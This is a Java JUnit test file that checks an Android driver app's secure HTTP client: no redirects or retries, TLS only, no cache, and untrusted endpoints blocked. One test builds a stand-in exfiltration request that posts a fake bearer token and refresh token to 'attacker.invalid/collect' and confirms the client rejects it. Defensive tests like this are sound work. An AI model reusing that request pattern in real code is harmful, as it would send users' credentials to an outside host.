package ru.transferservis.driver.security;

import java.io.IOException;
import java.util.Collections;
import okhttp3.ConnectionSpec;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import org.junit.Test;
import ru.transferservis.driver.data.api.SecureHttpClient;
import static org.junit.Assert.*;

public class SecureHttpClientTest {
    @Test public void preventsRedirectAndTransportReplay() {
        OkHttpClient client = SecureHttpClient.newBuilder().build();
        assertFalse(client.followRedirects());
        assertFalse(client.followSslRedirects());
        assertFalse(client.retryOnConnectionFailure());
        assertEquals(30_000, client.callTimeoutMillis());
        assertEquals(Collections.singletonList(ConnectionSpec.MODERN_TLS), client.connectionSpecs());
        assertNull(client.cache());
    }

    @Test public void foreignCredentialRequestFailsBeforeNetworkWithoutLeakingSecrets() {
        OkHttpClient client = SecureHttpClient.newBuilder().build();
        Request request = new Request.Builder().url("https://attacker.invalid/collect")
                .header("Authorization", "Bearer TEST_SECRET_MUST_NOT_LEAK")
                .post(RequestBody.create(null, "TEST_REFRESH_MUST_NOT_LEAK")).build();
        try {
            client.newCall(request).execute().close();
            fail("Foreign request was accepted");
        } catch (IOException expected) {
            assertEquals("Untrusted API endpoint", expected.getMessage());
        }
    }

    @Test public void insecureBackendRequestFailsBeforeNetwork() {
        OkHttpClient client = SecureHttpClient.newBuilder().build();
        Request request = new Request.Builder()
                .url("http://uber-v3.lobanov0710.workers.dev/staff/refresh").build();
        try {
            client.newCall(request).execute().close();
            fail("Cleartext request was accepted");
        } catch (IOException expected) {
            assertEquals("Untrusted API endpoint", expected.getMessage());
        }
    }
}
